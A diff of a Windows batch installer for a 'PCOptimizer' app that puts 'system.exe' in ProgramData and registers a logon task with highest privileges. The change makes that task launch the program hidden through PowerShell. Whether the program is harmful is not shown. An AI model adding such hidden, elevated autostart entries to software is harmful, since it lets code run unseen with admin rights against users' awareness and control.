@@ -7,7 +7,6 @@ set "APP_NAME=PCOptimizer"
 set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
 set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
 set "EXE_NAME=system.exe"
-
 :: =========================================
 
 echo [1/6] Checking admin privileges...
@@ -45,10 +44,10 @@ if exist "%INSTALL_DIR%\pc-optimizer" (
     rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
 )
 
-echo [6/6] Creating scheduled task (startup launcher)...
+echo [6/6] Creating hidden startup task...
 
 schtasks /create /tn "%APP_NAME%" ^
- /tr "\"%INSTALL_DIR%\%EXE_NAME%\"" ^
+ /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
  /sc onlogon ^
  /rl highest ^
  /f >nul
@@ -61,5 +60,5 @@ if %errorlevel% neq 0 (
 
 echo.
 echo Installation complete.
-echo The optimizer will now run automatically on user login.
+echo The optimizer will now run automatically on login (hidden).
 pause
